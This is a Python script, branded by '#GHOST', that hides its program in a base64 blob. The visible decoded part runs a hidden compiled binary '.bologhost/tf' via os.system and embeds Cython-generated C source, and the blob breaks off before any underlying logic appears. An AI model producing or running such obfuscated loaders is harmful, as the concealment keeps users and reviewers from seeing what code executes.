# THIS ENCODE BY #GHOST | @GHOST_RFX
import os,base64
GHOST = b'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKcHJpbnQoIlx4MWJbMTs5Mm1ceDFiWzM4OzU7NDZtTE9BRElOR+KAouKAouKAoiIpCnByaW50KCcnKQpwcmludCgiXHgxYlsxOzkybVx4MWJbMzg7NTs1MG0jIyMjVEhJUyBJUyBFTkNPREVEIEJZICNHSE9TVCDigKIgQEdIT1NUX1JGWCIpCnByaW50KCcnKQpQUkVGSVg9c3lzLnByZWZpeApFWEVDVVRFX0ZJTEUgPSAiLmJvbG9naG9zdC90ZiIKRVhQT1JUX1BZVEhPTkhPTUUgPSJleHBvcnQgUFlUSE9OSE9NRT0iK3N5cy5wcmVmaXgKRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFID0iZXhwb3J0IFBZVEhPTl9FWEVDVVRBQkxFPSIrIHN5cy5leGVjdXRhYmxlClJVTiA9ICIuLyIrIEVYRUNVVEVfRklMRQppZiBvcy5wYXRoLmlzZmlsZShFWEVDVVRFX0ZJTEUpOgogICAgb3Muc3lzdGVtKEVYUE9SVF9QWVRIT05IT01FICsiJiYiKyBFWFBPUlRfUFlUSE9OX0VYRUNVVEFCTEUgKyImJiIrIFJVTikKICAgIGV4aXQoMCkKQ19TT1VSQ0UgPSByIiIiCgojaWZuZGVmIFBZX1NTSVpFX1RfQ0xFQU4KI2RlZmluZSBQWV9TU0laRV9UX0NMRUFOCiNlbmRpZiAKCiNpZiBkZWZpbmVkKFB5X0xJTUlURURfQVBJKQogICNpZiAhZGVmaW5lZChDWVRIT05fTElNSVRFRF9BUEkpCiAgI2RlZmluZSBDWVRIT05fTElNSVRFRF9BUEkgMQogICNlbmRpZgojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgX01TQ19WRVIKICAjcHJhZ21hIG1lc3NhZ2UgKCJMaW1pdGVkIEFQSSB1c2FnZSBpcyBlbmFibGVkIHdpdGggJ0NZVEhPTl9MSU1JVEVEX0FQSScgYnV0ICdQeV9MSU1JVEVEX0FQSScgZG9lcyBub3QgZGVmaW5lIGEgUHl0aG9uIHRhcmdldCB2ZXJzaW9uLiBDb25zaWRlciBzZXR0aW5nICdQeV9MSU1JVEVEX0FQSScgaW5zdGVhZC4iKQogICNlbHNlCiAgI3dhcm5pbmcgTGltaXRlZCBBUEkgdXNhZ2UgaXMgZW5hYmxlZCB3aXRoICdDWVRIT05fTElNSVRFRF9BUEknIGJ1dCAnUHlfTElNSVRFRF9BUEknIGRvZXMgbm90IGRlZmluZSBhIFB5dGhvbiB0YXJnZXQgdmVyc2lvbi4gQ29uc2lkZXIgc2V0dGluZyAnUHlfTElNSVRFRF9BUEknIGluc3RlYWQuCiAgI2VuZGlmCiNlbmRpZgoKI2luY2x1ZGUgIlB5dGhvbi5oIgojaWZuZGVmIFB5X1BZVEhPTl9ICiAgICAjZXJyb3IgUHl0aG9uIGhlYWRlcnMgbmVlZGVkIHRvIGNvbXBpbGUgQyBleHRlbnNpb25zLCBwbGVhc2UgaW5zdGFsbCBkZXZlbG9wbWVudCB2ZXJzaW9uIG9mIFB5dGhvbi4KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMDAwCiAgICAjZXJyb3IgQ3l0aG9uIHJlcXVpcmVzIFB5dGhvbiAzLjgrLgojZWxzZQojZGVmaW5lIF9fUFlYX0FCSV9WRVJTSU9OICIzXzFfNiIKI2RlZmluZSBDWVRIT05fSEVYX1ZFUlNJT04gMHgwMzAxMDZGMAojZGVmaW5lIENZVEhPTl9GVVRVUkVfRElWSVNJT04gMQoKI2luY2x1ZGUgPHN0ZGRlZi5oPgojaWZuZGVmIG9mZnNldG9mCiAgI2RlZmluZSBvZmZzZXRvZih0eXBlLCBtZW1iZXIpICggKHNpemVfdCkgJiAoKHR5cGUqKTApIC0+IG1lbWJlciApCiNlbmRpZgojaWYgIWRlZmluZWQoX1dJTjMyKSAmJiAhZGVmaW5lZChXSU4zMikgJiYgIWRlZmluZWQoTVNfV0lORE9XUykKICAjaWZuZGVmIF9fc3RkY2FsbAogICAgI2RlZmluZSBfX3N0ZGNhbGwKICAjZW5kaWYKICAjaWZuZGVmIF9fY2RlY2wKICAgICNkZWZpbmUgX19jZGVjbAogICNlbmRpZgogICNpZm5kZWYgX19mYXN0Y2FsbAogICAgI2RlZmluZSBfX2Zhc3RjYWxsCiAgI2VuZGlmCiNlbmRpZgojaWZuZGVmIERMX0lNUE9SVAogICNkZWZpbmUgRExfSU1QT1JUKHQpIHQKI2VuZGlmCiNpZm5kZWYgRExfRVhQT1JUCiAgI2RlZmluZSBETF9FWFBPUlQodCkgdAojZW5kaWYKI2RlZmluZSBfX1BZWF9DT01NQSAsCiNpZm5kZWYgSEFWRV9MT05HX0xPTkcKICAjZGVmaW5lIEhBVkVfTE9OR19MT05HCiNlbmRpZgojaWZuZGVmIFBZX0xPTkdfTE9ORwogICNkZWZpbmUgUFlfTE9OR19MT05HIExPTkdfTE9ORwojZW5kaWYKI2lmbmRlZiBQeV9IVUdFX1ZBTAogICNkZWZpbmUgUHlfSFVHRV9WQUwgSFVHRV9WQUwKI2VuZGlmCiNkZWZpbmUgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCBQWV9WRVJTSU9OX0hFWAojaWYgZGVmaW5lZChHUkFBTFZNX1BZVEhPTikKICAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUgogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAxCiAgI3VuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMAogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMAogICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMCiAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMAogICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAwCiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDEKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMQogICN1bmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDEKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbGlmIGRlZmluZWQoUFlQWV9WRVJTSU9OKQogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMAogICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMAogICN1bmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMQogICN1bmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAwCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDAKICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMAogICN1bmRlZiBDWVRIT05fRkFTVF9HSUwKICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwCiAgI3VuZGVmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgICN1bmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDAKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQpCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCiAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIChQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzBDMDApCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAoUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMxMTAwKQogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMAojZWxpZiBkZWZpbmVkKENZVEhPTl9MSU1JVEVEX0FQSSkKICAjaWZkZWYgUHlfTElNSVRFRF9BUEkKICAgICN1bmRlZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYCiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggUHlfTElNSVRFRF9BUEkKICAjZW5kaWYKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAwCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAxCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIDAKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDAKICAjdW5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSwogICNkZWZpbmUgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAwCiAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMQogICN1bmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAwCiAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDAKICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAwCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTCiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMAogICNlbmRpZgogICN1bmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDAKICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDAKICAjdW5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMAogICN1bmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAwCiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIDAKICAjdW5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApCiAgI3VuZGVmIENZVEhPTl9GQVNUX1BZQ0FMTAogICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDAKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcKICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMAogICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfQU1fU0VORAogICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMCkKICAjZW5kaWYKICAjdW5kZWYgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TCiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMAogICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgI2RlZmluZSBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLIDAKICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MKICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwCiAgI2VuZGlmCiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgI2RlZmluZSBDWVRIT05fVVNFX0ZSRUVMSVNUUyAwCiNlbHNlCiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIDEKICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMAogICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwCiAgI2lmZGVmIFB5X0dJTF9ESVNBQkxFRAogICAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAxCiAgI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgMAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgICN1bmRlZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1RZUEVfU0xPVFMpCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TTE9UUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUyAxCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTKQogICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFMgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfSU5URVJOQUxTIDEKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMgogICAgI3VuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwCiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUikKICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAwCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICAjdW5kZWYgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUwogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDEKICAjZWxpZiAhZGVmaW5lZChDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTKQogICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDAKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICNkZWZpbmUgQ1lUSE9OX1VOUEFDS19NRVRIT0RTIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQogICAgI2RlZmluZSBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUgMQogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTAogICAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMAogICNlbGlmICFkZWZpbmVkKENZVEhPTl9GQVNUX0dJTCkKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfR0lMIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTYpCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgI2RlZmluZSBDWVRIT05fTUVUSF9GQVNUQ0FMTCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNBTEwKICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfUFlDQUxMIDEKICAjZW5kaWYKICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUwogICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMQogICNlbmRpZgogICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwCiAgI2VuZGlmCiAgI2lmbmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HCiAgICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgKFBZX1ZFUlNJT05fSEVYID49IDB